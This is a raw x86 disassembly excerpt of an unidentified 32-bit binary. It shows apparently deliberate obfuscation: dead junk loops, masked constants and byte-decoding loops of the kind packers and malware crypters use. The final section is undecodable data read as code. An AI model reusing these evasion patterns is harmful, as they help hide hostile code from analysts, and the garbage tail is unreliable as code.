  41c2f1:	mov    ecx,DWORD PTR [ebp+0x10]
  41c2f4:	xor    edx,edx
  41c2f6:	xor    eax,esi
  41c2f8:	add    eax,edi
  41c2fa:	add    ecx,0xfabdbef1
  41c300:	adc    edx,0xffffffff
  41c303:	xor    ecx,ebx
  41c305:	xor    edx,0x0
  41c308:	mov    DWORD PTR [ebp-0x70],ecx
  41c30b:	mov    DWORD PTR [ebp-0x6c],edx
  41c30e:	xor    edx,edx
  41c310:	mov    ecx,eax
  41c312:	add    ecx,0xfabdbef1
  41c318:	adc    edx,0xffffffff
  41c31b:	xor    ecx,ebx
  41c31d:	xor    edx,0x0
  41c320:	mov    DWORD PTR [ebp-0x20],eax
  41c323:	cmp    ecx,DWORD PTR [ebp-0x70]
  41c326:	jne    0x41c335
  41c32c:	cmp    edx,DWORD PTR [ebp-0x6c]
  41c32f:	je     0x41c3a9
  41c335:	mov    ecx,DWORD PTR [ebp+0xc]
  41c338:	mov    edx,DWORD PTR [ebp-0x24]
  41c33b:	xor    edx,esi
  41c33d:	xor    ecx,esi
  41c33f:	add    ecx,eax
  41c341:	add    edx,edi
  41c343:	imul   edx,eax
  41c346:	mov    eax,DWORD PTR [ebp-0x3c]
  41c349:	mov    ebx,DWORD PTR [ebp-0x38]
  41c34c:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  41c353:	mov    BYTE PTR [edx+eax*1],cl
  41c356:	mov    eax,DWORD PTR [ebp-0x24]
  41c359:	mov    ecx,DWORD PTR [ebp-0x20]
  41c35c:	mov    edx,DWORD PTR [ebp+0x10]
  41c35f:	xor    eax,esi
  41c361:	lea    eax,[ecx+eax*1+0x3272db]
  41c368:	xor    ecx,ecx
  41c36a:	add    edx,0xfabdbef1
  41c370:	adc    ecx,0xffffffff
  41c373:	xor    ecx,0x0
  41c376:	mov    DWORD PTR [ebp-0x7c],ecx
  41c379:	xor    ebx,ebx
  41c37b:	xor    edx,0x8a29a123
  41c381:	mov    ecx,eax
  41c383:	add    ecx,0xfabdbef1
  41c389:	adc    ebx,0xffffffff
  41c38c:	xor    ecx,0x8a29a123
  41c392:	xor    ebx,0x0
  41c395:	mov    DWORD PTR [ebp-0x20],eax
  41c398:	cmp    ecx,edx
  41c39a:	jne    0x41c335
  41c3a0:	cmp    ebx,DWORD PTR [ebp-0x7c]
  41c3a3:	jne    0x41c335
  41c3a9:	mov    eax,DWORD PTR [ebp-0x1c]
  41c3ac:	mov    eax,DWORD PTR [eax]
  41c3ae:	pop    edi
  41c3af:	pop    esi
  41c3b0:	pop    ebx
  41c3b1:	leave  
  41c3b2:	ret    0xc
  41c3b5:	push   ebp
  41c3b6:	mov    ebp,esp
  41c3b8:	sub    esp,0xa4
  41c3be:	mov    ecx,DWORD PTR [ebp+0x8]
  41c3c1:	and    DWORD PTR ds:0x42a01c,0x0
  41c3cb:	jmp    0x41c3db
  41c3d0:	mov    eax,ds:0x42a01c
  41c3d5:	inc    eax
  41c3d6:	mov    ds:0x42a01c,eax
  41c3db:	cmp    DWORD PTR ds:0x42a01c,0x17
  41c3e2:	jae    0x41c404
  41c3e8:	cmp    DWORD PTR ds:0x42a01c,0x25
  41c3ef:	jne    0x41c3fe
  41c3f5:	push   DWORD PTR [ebp-0x14]
  41c3f8:	call   DWORD PTR ds:0x42401c
  41c3fe:	jmp    0x41c3d0
  41c403:	inc    eax
  41c404:	mov    eax,0x8a85
  41c409:	sub    DWORD PTR ds:0x42a008,0x36bb
  41c413:	xor    ax,WORD PTR [ecx+0x20]
  41c417:	mov    DWORD PTR ds:0x42c018,0x1e
  41c421:	cmp    DWORD PTR ds:0x42c018,0x0
  41c428:	je     0x41c465
  41c42e:	cmp    DWORD PTR ds:0x42c018,0x25
  41c435:	jne    0x41c449
  41c43b:	push   DWORD PTR [ebp-0x10]
  41c43e:	push   0x3dbe
  41c443:	call   DWORD PTR ds:0x424020
  41c449:	mov    ecx,DWORD PTR ds:0x42c018
  41c44f:	dec    ecx
  41c450:	mov    DWORD PTR ds:0x42c018,ecx
  41c456:	jmp    0x41c421
  41c45b:	sub    DWORD PTR ds:0x428014,0x2577
  41c465:	mov    ecx,0x3b4b
  41c46a:	xor    DWORD PTR ds:0x42b00c,0x43e8
  41c474:	add    ax,cx
  41c477:	mov    DWORD PTR ds:0x429004,0x1e
  41c481:	cmp    DWORD PTR ds:0x429004,0x0
  41c488:	je     0x41c4e7
  41c48e:	cmp    DWORD PTR ds:0x429004,0x2c
  41c495:	jne    0x41c4c5
  41c49b:	push   0x42c000
  41c4a0:	push   0x3d75
  41c4a5:	push   DWORD PTR [ebp-0x20]
  41c4a8:	push   0x42c004
  41c4ad:	push   DWORD PTR [ebp-0xc]
  41c4b0:	push   0x423842
  41c4b5:	push   0x75d0
  41c4ba:	push   0x7026
  41c4bf:	call   DWORD PTR ds:0x424024
  41c4c5:	xor    ecx,ecx
  41c4c7:	add    ecx,DWORD PTR ds:0x429004
  41c4cd:	dec    ecx
  41c4ce:	mov    DWORD PTR ds:0x429004,ecx
  41c4d4:	jmp    0x41c481
  41c4d9:	mov    ecx,DWORD PTR ds:0x421a66
  41c4df:	mov    ecx,DWORD PTR [ecx]
  41c4e1:	and    DWORD PTR ds:0x428024,ecx
  41c4e7:	movzx  eax,ax
  41c4ea:	xor    DWORD PTR ds:0x42a004,0x42801c
  41c4f4:	mov    DWORD PTR [ebp-0x18],eax
  41c4f7:	and    DWORD PTR ds:0x42801c,0x7f28
  41c501:	mov    BYTE PTR [ebp-0x1],0x61
  41c505:	xor    ecx,0x4092
  41c50b:	lea    eax,[ebp-0x1]
  41c50e:	sub    DWORD PTR ds:0x429008,0x31e1
  41c518:	mov    DWORD PTR [ebp-0x10],eax
  41c51b:	add    ecx,DWORD PTR ds:0x428010
  41c521:	mov    al,BYTE PTR [ebp-0x1]
  41c524:	and    ecx,0x7ba8
  41c52a:	mov    ecx,DWORD PTR [ebp-0x10]
  41c52d:	xor    al,0x6f
  41c52f:	and    DWORD PTR ds:0x428008,0x42b018
  41c539:	sub    al,0xd
  41c53b:	adc    DWORD PTR ds:0x428018,0x42b008
  41c545:	mov    BYTE PTR [ecx],al
  41c547:	add    DWORD PTR ds:0x42a01c,ecx
  41c54d:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  41c554:	mov    DWORD PTR ds:0x42a010,0x1c
  41c55e:	cmp    DWORD PTR ds:0x42a010,0x0
  41c565:	je     0x41c5a5
  41c56b:	cmp    DWORD PTR ds:0x42a010,0x2c
  41c572:	jne    0x41c58b
  41c578:	push   0x5aa3
  41c57d:	push   0x697d
  41c582:	push   DWORD PTR [ebp-0x28]
  41c585:	call   DWORD PTR ds:0x424028
  41c58b:	xor    ecx,ecx
  41c58d:	add    ecx,DWORD PTR ds:0x42a010
  41c593:	dec    ecx
  41c594:	mov    DWORD PTR ds:0x42a010,ecx
  41c59a:	jmp    0x41c55e
  41c59f:	sbb    DWORD PTR ds:0x42a000,ebx
  41c5a5:	push   ebx
  41c5a6:	sbb    eax,ecx
  41c5a8:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  41c5af:	and    DWORD PTR ds:0x428020,0x0
  41c5b9:	jmp    0x41c5cb
  41c5be:	mov    ecx,DWORD PTR ds:0x428020
  41c5c4:	inc    ecx
  41c5c5:	mov    DWORD PTR ds:0x428020,ecx
  41c5cb:	cmp    DWORD PTR ds:0x428020,0x19
  41c5d2:	jae    0x41c5fa
  41c5d8:	cmp    DWORD PTR ds:0x428020,0x28
  41c5df:	jne    0x41c5f5
  41c5e5:	push   0x423998
  41c5ea:	push   0x4238fd
  41c5ef:	call   DWORD PTR ds:0x424030
  41c5f5:	jmp    0x41c5be
  41c5fa:	mov    ecx,DWORD PTR [ebp-0x14]
  41c5fd:	push   esi
  41c5fe:	movzx  esi,BYTE PTR ds:0x42a014
  41c605:	sub    esi,DWORD PTR ds:0x429018
  41c60b:	mov    DWORD PTR ds:0x42a014,esi
  41c611:	mov    eax,0x7510893
  41c616:	mov    esi,DWORD PTR ds:0x42a01c
  41c61c:	adc    esi,DWORD PTR ds:0x42a00c
  41c622:	mov    DWORD PTR ds:0x42a01c,esi
  41c628:	xor    ecx,eax
  41c62a:	neg    esi
  41c62c:	mov    esi,0x3272db
  41c631:	push   edi
  41c632:	add    ecx,esi
  41c634:	mov    DWORD PTR ds:0x42b018,0x6b60
  41c63e:	jmp    0x41c662
  41c643:	mov    DWORD PTR ds:0x42b000,0x231b
  41c64d:	mov    dl,BYTE PTR [ebp-0x1]
  41c650:	mov    DWORD PTR ds:0x42a018,0x496a
  41c65a:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  41c661:	inc    ecx
  41c662:	mov    DWORD PTR ds:0x429014,0x116e
  41c66c:	cmp    ecx,0x40
  41c66f:	mov    DWORD PTR ds:0x42a014,0x7e65
  41c679:	jb     0x41c643
  41c67f:	and    edx,DWORD PTR ds:0x428008
  41c685:	mov    edx,DWORD PTR [ebp-0x14]
  41c688:	sbb    DWORD PTR ds:0x429004,0x429010
  41c692:	xor    edx,eax
  41c694:	add    edx,esi
  41c696:	jmp    0x41c829
  41c69b:	mov    DWORD PTR ds:0x429018,0x1f
  41c6a5:	cmp    DWORD PTR ds:0x429018,0x0
  41c6ac:	je     0x41c713
  41c6b2:	cmp    DWORD PTR ds:0x429018,0xf
  41c6b9:	jne    0x41c6dd
  41c6bf:	push   DWORD PTR [ebp-0x20]
  41c6c2:	push   DWORD PTR [ebp-0x10]
  41c6c5:	push   0x45b6
  41c6ca:	push   DWORD PTR [ebp-0x1c]
  41c6cd:	push   0x5bd1
  41c6d2:	push   0x42c008
  41c6d7:	call   DWORD PTR ds:0x424038
  41c6dd:	cmp    DWORD PTR ds:0x429018,0x10
  41c6e4:	jne    0x41c6f7
  41c6ea:	mov    edi,DWORD PTR ds:0x429018
  41c6f0:	dec    edi
  41c6f1:	mov    DWORD PTR ds:0x429018,edi
  41c6f7:	mov    edi,DWORD PTR ds:0x429018
  41c6fd:	dec    edi
  41c6fe:	mov    DWORD PTR ds:0x429018,edi
  41c704:	jmp    0x41c6a5
  41c709:	or     DWORD PTR ds:0x42a000,0x7430
  41c713:	mov    edi,DWORD PTR [ebp+0x8]
  41c716:	mov    DWORD PTR ds:0x428028,0x1e
  41c720:	cmp    DWORD PTR ds:0x428028,0x0
  41c727:	je     0x41c766
  41c72d:	cmp    DWORD PTR ds:0x428028,0x2e
  41c734:	jne    0x41c74a
  41c73a:	push   0x42a008
  41c73f:	push   0x6949
  41c744:	call   DWORD PTR ds:0x42403c
  41c74a:	mov    ecx,DWORD PTR ds:0x428028
  41c750:	dec    ecx
  41c751:	mov    DWORD PTR ds:0x428028,ecx
  41c757:	jmp    0x41c720
  41c75c:	adc    DWORD PTR ds:0x42b00c,0x42c008
  41c766:	mov    ecx,0x8a85
  41c76b:	add    DWORD PTR ds:0x42b000,0x429018
  41c775:	xor    cx,WORD PTR [edi+edx*4+0x2]
  41c77a:	and    DWORD PTR ds:0x428018,0x0
  41c784:	jmp    0x41c796
  41c789:	mov    edi,DWORD PTR ds:0x428018
  41c78f:	inc    edi
  41c790:	mov    DWORD PTR ds:0x428018,edi
  41c796:	cmp    DWORD PTR ds:0x428018,0x1a
  41c79d:	jae    0x41c7d2
  41c7a3:	cmp    DWORD PTR ds:0x428018,0x25
  41c7aa:	jne    0x41c7c0
  41c7b0:	push   0x55c3
  41c7b5:	push   0x423973
  41c7ba:	call   DWORD PTR ds:0x424040
  41c7c0:	jmp    0x41c789
  41c7c5:	movzx  edi,WORD PTR ds:0x42901c
  41c7cc:	sub    DWORD PTR ds:0x42b00c,edi
  41c7d2:	mov    edi,0x3b4b
  41c7d7:	add    cx,di
  41c7da:	movzx  ecx,cx
  41c7dd:	mov    DWORD PTR [ebp-0x10],ecx
  41c7e0:	mov    ecx,DWORD PTR [ebp+0x8]
  41c7e3:	sub    DWORD PTR ds:0x428004,0x4ea
  41c7ed:	movzx  ecx,WORD PTR [ecx+edx*4]
  41c7f1:	add    DWORD PTR ds:0x42b01c,0x42b000
  41c7fb:	xor    ecx,0x8a85
  41c801:	sub    DWORD PTR ds:0x428014,0x428000
  41c80b:	add    ecx,edi
  41c80d:	mov    edi,DWORD PTR [ebp-0x10]
  41c810:	mov    DWORD PTR ds:0x42b004,0x1d90
  41c81a:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  41c821:	movzx  ecx,BYTE PTR ds:0x428010
  41c828:	inc    edx
  41c829:	mov    ecx,DWORD PTR [ebp-0x18]
  41c82c:	cmp    edx,ecx
  41c82e:	mov    DWORD PTR ds:0x429018,0x3a83
  41c838:	jne    0x41c69b
  41c83e:	and    edx,edx
  41c840:	mov    ecx,DWORD PTR [ebp-0x14]
  41c843:	mov    edx,DWORD PTR [ebp+0x10]
  41c846:	add    DWORD PTR ds:0x42c008,0x32e9
  41c850:	xor    ecx,eax
  41c852:	add    ecx,esi
  41c854:	sub    DWORD PTR ds:0x428020,0x428004
  41c85e:	mov    DWORD PTR [edx],ecx
  41c860:	sub    DWORD PTR ds:0x428028,0x1657
  41c86a:	mov    ecx,DWORD PTR [ebp-0x14]
  41c86d:	xor    ecx,eax
  41c86f:	sub    DWORD PTR ds:0x42b01c,0x42c010
  41c879:	add    ecx,esi
  41c87b:	mov    DWORD PTR [ebp-0x20],ecx
  41c87e:	mov    ecx,DWORD PTR ds:0x42a00c
  41c884:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  41c88b:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  41c892:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  41c899:	movzx  ecx,WORD PTR ds:0x42a004
  41c8a0:	mov    ecx,DWORD PTR [ebp-0xc]
  41c8a3:	mov    DWORD PTR [ebp+0x8],ecx
  41c8a6:	mov    DWORD PTR ds:0x42b008,0x111a
  41c8b0:	jmp    0x41cb0e
  41c8b5:	xor    edx,0x5725
  41c8bb:	mov    ecx,DWORD PTR [ebp+0x8]
  41c8be:	mov    edx,DWORD PTR ds:0x42b000
  41c8c4:	add    DWORD PTR ds:0x42b01c,edx
  41c8ca:	mov    edx,DWORD PTR [ebp-0x8]
  41c8cd:	xor    ecx,eax
  41c8cf:	xor    edx,eax
  41c8d1:	sub    ecx,edx
  41c8d3:	sub    ecx,esi
  41c8d5:	and    DWORD PTR ds:0x428000,0x0
  41c8df:	mov    edx,DWORD PTR ds:0x428000
  41c8e5:	inc    edx
  41c8e6:	mov    DWORD PTR ds:0x428000,edx
  41c8ec:	cmp    DWORD PTR ds:0x428000,0xb
  41c8f3:	jne    0x41c904
  41c8f9:	push   0x42395e
  41c8fe:	call   DWORD PTR ds:0x424044
  41c904:	cmp    DWORD PTR ds:0x428000,0xa
  41c90b:	jne    0x41c91e
  41c911:	mov    edx,DWORD PTR ds:0x428000
  41c917:	inc    edx
  41c918:	mov    DWORD PTR ds:0x428000,edx
  41c91e:	cmp    DWORD PTR ds:0x428000,0x15
  41c925:	jb     0x41c8df
  41c92b:	and    DWORD PTR ds:0x429018,0x0
  41c935:	jmp    0x41c949
  41c93a:	xor    edx,edx
  41c93c:	xor    edx,DWORD PTR ds:0x429018
  41c942:	inc    edx
  41c943:	mov    DWORD PTR ds:0x429018,edx
  41c949:	cmp    DWORD PTR ds:0x429018,0x10
  41c950:	jae    0x41c9c2
  41c956:	cmp    DWORD PTR ds:0x429018,0x17
  41c95d:	jne    0x41c976
  41c963:	push   DWORD PTR [ebp-0x24]
  41c966:	push   0x42801c
  41c96b:	push   0x423a94
  41c970:	call   DWORD PTR ds:0x424048
  41c976:	jmp    0x41c93a
  41c97b:	and    DWORD PTR ds:0x42c004,0x0
  41c985:	mov    edx,DWORD PTR ds:0x42c004
  41c98b:	inc    edx
  41c98c:	mov    DWORD PTR ds:0x42c004,edx
  41c992:	cmp    DWORD PTR ds:0x42c004,0x1e
  41c999:	jne    0x41c9af
  41c99f:	push   0x42b018
  41c9a4:	push   0x6f2d
  41c9a9:	call   DWORD PTR ds:0x424014
  41c9af:	cmp    DWORD PTR ds:0x42c004,0x16
  41c9b6:	jb     0x41c985
  41c9bc:	and    DWORD PTR ds:0x42c014,ecx
  41c9c2:	xor    ecx,eax
  41c9c4:	adc    DWORD PTR ds:0x42c01c,0x41e5
  41c9ce:	mov    DWORD PTR [ebp+0x8],ecx
  41c9d1:	and    DWORD PTR ds:0x429010,0x0
  41c9db:	xor    edx,edx
  41c9dd:	xor    edx,DWORD PTR ds:0x429010
  41c9e3:	inc    edx
  41c9e4:	mov    DWORD PTR ds:0x429010,edx
  41c9ea:	cmp    DWORD PTR ds:0x429010,0x4
  41c9f1:	jne    0x41ca1f
  41c9f7:	push   DWORD PTR [ebp-0x14]
  41c9fa:	push   0x42b010
  41c9ff:	push   0x6800
  41ca04:	push   0x42a000
  41ca09:	push   DWORD PTR [ebp-0x10]
  41ca0c:	push   0x5c37
  41ca11:	push   0x63a5
  41ca16:	push   DWORD PTR [ebp-0x1c]
  41ca19:	call   DWORD PTR ds:0x424018
  41ca1f:	cmp    DWORD PTR ds:0x429010,0x3
  41ca26:	jne    0x41ca3b
  41ca2c:	xor    edx,edx
  41ca2e:	add    edx,DWORD PTR ds:0x429010
  41ca34:	inc    edx
  41ca35:	mov    DWORD PTR ds:0x429010,edx
  41ca3b:	cmp    DWORD PTR ds:0x429010,0x1e
  41ca42:	jb     0x41c9db
  41ca48:	and    edx,0x1801
  41ca4e:	mov    ecx,DWORD PTR [ebp+0x8]
  41ca51:	and    DWORD PTR ds:0x42c018,0x0
  41ca5b:	jmp    0x41ca6f
  41ca60:	xor    edx,edx
  41ca62:	add    edx,DWORD PTR ds:0x42c018
  41ca68:	inc    edx
  41ca69:	mov    DWORD PTR ds:0x42c018,edx
  41ca6f:	cmp    DWORD PTR ds:0x42c018,0x1f
  41ca76:	jae    0x41cab1
  41ca7c:	cmp    DWORD PTR ds:0x42c018,0x12
  41ca83:	jne    0x41ca92
  41ca89:	push   DWORD PTR [ebp-0x28]
  41ca8c:	call   DWORD PTR ds:0x42401c
  41ca92:	cmp    DWORD PTR ds:0x42c018,0x11
  41ca99:	jne    0x41caac
  41ca9f:	mov    edx,DWORD PTR ds:0x42c018
  41caa5:	inc    edx
  41caa6:	mov    DWORD PTR ds:0x42c018,edx
  41caac:	jmp    0x41ca60
  41cab1:	mov    edx,DWORD PTR [ebp-0x64]
  41cab4:	lea    ecx,[edx+ecx*1+0x5708f5]
  41cabb:	mov    DWORD PTR [ebp-0x64],ecx
  41cabe:	mov    ecx,DWORD PTR [ebp+0x8]
  41cac1:	mov    edx,DWORD PTR [ebp-0x60]
  41cac4:	lea    ecx,[edx+ecx*1+0x5708f5]
  41cacb:	mov    DWORD PTR [ebp-0x60],ecx
  41cace:	mov    ecx,DWORD PTR [ebp+0x8]
  41cad1:	mov    edx,DWORD PTR [ebp-0x5c]
  41cad4:	lea    ecx,[edx+ecx*1+0x5708f4]
  41cadb:	mov    DWORD PTR [ebp-0x5c],ecx
  41cade:	mov    ecx,DWORD PTR [ebp+0x8]
  41cae1:	mov    edx,DWORD PTR [ebp-0x58]
  41cae4:	lea    ecx,[edx+ecx*1+0x5708fb]
  41caeb:	mov    DWORD PTR [ebp-0x58],ecx
  41caee:	mov    ecx,DWORD PTR [ebp+0x8]
  41caf1:	mov    edx,DWORD PTR [ebp-0x54]
  41caf4:	lea    ecx,[edx+ecx*1+0x5708fa]
  41cafb:	mov    DWORD PTR [ebp-0x54],ecx
  41cafe:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb01:	mov    edx,DWORD PTR [ebp-0x50]
  41cb04:	lea    ecx,[edx+ecx*1+0x5708f9]
  41cb0b:	mov    DWORD PTR [ebp-0x50],ecx
  41cb0e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb11:	xor    ecx,eax
  41cb13:	add    ecx,esi
  41cb15:	jne    0x41c8b5
  41cb1b:	jmp    0x41f062
  41cb20:	mov    ecx,DWORD PTR [ebp-0x1c]
  41cb23:	mov    edx,DWORD PTR [ebp-0x8]
  41cb26:	xor    ecx,eax
  41cb28:	xor    edx,eax
  41cb2a:	sub    ecx,edx
  41cb2c:	sub    ecx,esi
  41cb2e:	xor    ecx,eax
  41cb30:	mov    DWORD PTR [ebp-0x1c],ecx
  41cb33:	mov    ecx,DWORD PTR [ebp-0xc]
  41cb36:	mov    DWORD PTR [ebp+0x8],ecx
  41cb39:	jmp    0x41cb6b
  41cb3e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb41:	mov    edx,DWORD PTR [ebp-0x8]
  41cb44:	xor    ecx,eax
  41cb46:	xor    edx,eax
  41cb48:	sub    ecx,edx
  41cb4a:	sub    ecx,esi
  41cb4c:	xor    ecx,eax
  41cb4e:	mov    DWORD PTR [ebp+0x8],ecx
  41cb51:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb54:	mov    edx,DWORD PTR [ebp+0x8]
  41cb57:	imul   edx,edx,0x5708f5
  41cb5d:	xor    ecx,eax
  41cb5f:	add    ecx,esi
  41cb61:	lea    ecx,[ebp+ecx*4-0x64]
  41cb65:	mov    edi,DWORD PTR [ecx]
  41cb67:	add    edx,edi
  41cb69:	mov    DWORD PTR [ecx],edx
  41cb6b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb6e:	xor    ecx,eax
  41cb70:	add    ecx,esi
  41cb72:	jne    0x41cb3e
  41cb78:	mov    ecx,DWORD PTR [ebp-0x20]
  41cb7b:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41cb82:	mov    dl,BYTE PTR [ebp-0x1]
  41cb85:	cmp    cl,dl
  41cb87:	je     0x41cc60
  41cb8d:	mov    ecx,DWORD PTR [ebp-0x20]
  41cb90:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41cb97:	mov    edx,DWORD PTR [ebp+0xc]
  41cb9a:	cmp    cl,BYTE PTR [edx]
  41cb9c:	jne    0x41f074
  41cba2:	mov    ecx,DWORD PTR [ebp-0x14]
  41cba5:	mov    edx,DWORD PTR [ebp+0xc]
  41cba8:	movsx  edx,BYTE PTR [edx]
  41cbab:	xor    ecx,eax
  41cbad:	add    ecx,esi
  41cbaf:	cmp    edx,ecx
  41cbb1:	mov    ecx,DWORD PTR [ebp-0xc]
  41cbb4:	mov    DWORD PTR [ebp+0x8],ecx
  41cbb7:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbba:	je     0x421451
  41cbc0:	jmp    0x41cbf5
  41cbc5:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbc8:	mov    edx,DWORD PTR [ebp-0x8]
  41cbcb:	xor    ecx,eax
  41cbcd:	xor    edx,eax
  41cbcf:	sub    ecx,edx
  41cbd1:	sub    ecx,esi
  41cbd3:	xor    ecx,eax
  41cbd5:	mov    DWORD PTR [ebp+0x8],ecx
  41cbd8:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbdb:	mov    edx,DWORD PTR [ebp+0x8]
  41cbde:	xor    ecx,eax
  41cbe0:	imul   edx,edx,0x5708f5
  41cbe6:	add    ecx,esi
  41cbe8:	lea    ecx,[ebp+ecx*4-0x64]
  41cbec:	mov    edi,DWORD PTR [ecx]
  41cbee:	add    edx,edi
  41cbf0:	mov    DWORD PTR [ecx],edx
  41cbf2:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbf5:	xor    ecx,eax
  41cbf7:	add    ecx,esi
  41cbf9:	jne    0x41cbc5
  41cbff:	mov    ecx,DWORD PTR [ebp-0x14]
  41cc02:	mov    edx,DWORD PTR [ebp+0x8]
  41cc05:	xor    ecx,eax
  41cc07:	xor    edx,eax
  41cc09:	add    ecx,esi
  41cc0b:	add    edx,esi
  41cc0d:	cmp    ecx,edx
  41cc0f:	jae    0x41f008
  41cc15:	lea    edx,[ecx-0x3272db]
  41cc1b:	mov    DWORD PTR [ebp-0x18],edx
  41cc1e:	mov    edi,DWORD PTR [ebp-0x18]
  41cc21:	mov    DWORD PTR [ebp-0x24],0x705fd08
  41cc28:	lea    edx,[ebp-0x24]
  41cc2b:	mov    DWORD PTR [ebp-0x10],edx
  41cc2e:	mov    edx,DWORD PTR [ebp-0x10]
  41cc31:	add    DWORD PTR [edx],0x705fa08
  41cc37:	mov    ebx,DWORD PTR [ebp-0x10]
  41cc3a:	xor    edi,eax
  41cc3c:	add    edi,DWORD PTR [ebx]
  41cc3e:	lea    edx,[ebp+ecx*4-0x64]
  41cc42:	mov    ebx,DWORD PTR [edx]
  41cc44:	xor    edi,ebx
  41cc46:	mov    DWORD PTR [edx],edi
  41cc48:	mov    edx,DWORD PTR [ebp+0x8]
  41cc4b:	xor    edx,eax
  41cc4d:	inc    ecx
  41cc4e:	inc    DWORD PTR [ebp-0x18]
  41cc51:	add    edx,esi
  41cc53:	cmp    ecx,edx
  41cc55:	jb     0x41cc1e
  41cc5b:	jmp    0x41f008
  41cc60:	mov    ecx,DWORD PTR [ebp-0xc]
  41cc63:	mov    DWORD PTR [ebp+0x8],ecx
  41cc66:	jmp    0x41cc98
  41cc6b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc6e:	mov    edx,DWORD PTR [ebp-0x8]
  41cc71:	xor    ecx,eax
  41cc73:	xor    edx,eax
  41cc75:	sub    ecx,edx
  41cc77:	sub    ecx,esi
  41cc79:	xor    ecx,eax
  41cc7b:	mov    DWORD PTR [ebp+0x8],ecx
  41cc7e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc81:	mov    edx,DWORD PTR [ebp+0x8]
  41cc84:	imul   edx,edx,0x5708f5
  41cc8a:	xor    ecx,eax
  41cc8c:	add    ecx,esi
  41cc8e:	lea    ecx,[ebp+ecx*4-0x64]
  41cc92:	mov    edi,DWORD PTR [ecx]
  41cc94:	add    edx,edi
  41cc96:	mov    DWORD PTR [ecx],edx
  41cc98:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc9b:	jmp    0x41effe
  41cca0:	mov    dl,0xcf
  41cca2:	enter  0x872f,0x27
  41cca6:	imul   ebp,DWORD PTR [edi+0x65],0x9cd7ebdc
  41ccad:	add    BYTE PTR [edi+0x1e],0x97
  41ccb1:	cld    
  41ccb2:	popa   
  41ccb3:	bound  edi,QWORD PTR [edi+ebx*2]
  41ccb6:	bound  esp,QWORD PTR [edx+0x35]
  41ccb9:	push   eax
  41ccba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ccbb:	dec    esp
  41ccbc:	xor    BYTE PTR [esi+esi*8],bl
  41ccbf:	push   cs
  41ccc0:	dec    DWORD PTR [edi-0x2ea60e91]
  41ccc6:	push   ebx
  41ccc7:	mov    eax,eax
  41ccc9:	xor    dl,BYTE PTR [ecx+ecx*4]
  41cccc:	(bad)  
  41cccd:	bound  esi,QWORD PTR [edx]
  41cccf:	inc    ecx
  41ccd0:	add    al,dh
  41ccd2:	into   
  41ccd3:	nop
  41ccd4:	js     0x41cd00
  41ccd6:	mov    eax,ds:0xd06afa98
  41ccdb:	mov    esi,0x711f35d9
  41cce0:	xchg   bh,al
  41cce2:	or     BYTE PTR [ecx-0x7c0c867e],al
  41cce8:	mov    ds:0x1ecd43ec,al
  41cced:	in     eax,dx
  41ccee:	mov    cl,0x2d
  41ccf0:	adc    al,BYTE PTR [eax+0x6a]
  41ccf3:	and    BYTE PTR [ecx+0x7dd602c5],0x97
  41ccfa:	push   edx
  41ccfb:	pop    ebp
  41ccfc:	lea    esp,[edx]
  41ccfe:	mov    ebx,0x21ce19a5
  41cd03:	pop    esp
  41cd04:	or     eax,0x5e0820df
  41cd09:	pop    eax
  41cd0a:	and    eax,0xc9fa5b3c
  41cd0f:	outs   dx,BYTE PTR ds:[esi]
  41cd10:	and    BYTE PTR [eax+esi*8],al
  41cd13:	dec    ebp
  41cd14:	lods   al,BYTE PTR ds:[esi]
  41cd15:	and    DWORD PTR [eax-0x63],0x6d
  41cd19:	xor    dh,BYTE PTR [edx]
  41cd1b:	cmp    al,0x50
  41cd1d:	push   ecx
  41cd1e:	test   al,0xa7
  41cd20:	mov    al,BYTE PTR [edx]
  41cd22:	inc    esp
  41cd23:	dec    ebp
  41cd24:	mov    ah,0x67
  41cd26:	jne    0x41cccc
  41cd28:	pop    es
  41cd29:	icebp  
  41cd2a:	jne    0x41cd49
  41cd2c:	and    eax,0x630b2e94
  41cd31:	outs   dx,DWORD PTR ds:[esi]
  41cd32:	xchg   ebx,eax
  41cd33:	mov    esi,0x1f015d94
  41cd38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd39:	mov    BYTE PTR [ebx+0x44bf3276],ch
  41cd3f:	popf   
  41cd40:	stos   DWORD PTR es:[edi],eax
  41cd41:	cwde   
  41cd42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd43:	pop    ds
  41cd44:	mov    esp,0x3dc3a3c
  41cd49:	push   esp
  41cd4a:	add    BYTE PTR [edi-0x22],dh
  41cd4d:	cs stos BYTE PTR es:[edi],al
  41cd4f:	test   ebx,esi
  41cd51:	bound  ebp,QWORD PTR [ebp-0x12]
  41cd54:	daa    
  41cd55:	push   esp
  41cd56:	jbe    0x41cd2a
  41cd58:	dec    ecx
  41cd59:	or     al,0xa0
  41cd5b:	stc    
  41cd5c:	ret    
  41cd5d:	xchg   DWORD PTR ds:0x8b283133,esp
  41cd63:	cmp    esp,DWORD PTR [esp+esi*4-0x5f]
  41cd67:	shl    BYTE PTR [ebx+eax*8],1
  41cd6a:	nop
  41cd6b:	repnz mov bl,0x6f
  41cd6e:	jo     0x41cd84
  41cd70:	push   ecx
  41cd71:	aam    0x82
  41cd73:	(bad)  
  41cd74:	retf   
  41cd75:	sub    al,0xba
  41cd77:	lods   eax,DWORD PTR ds:[esi]
  41cd78:	stc    
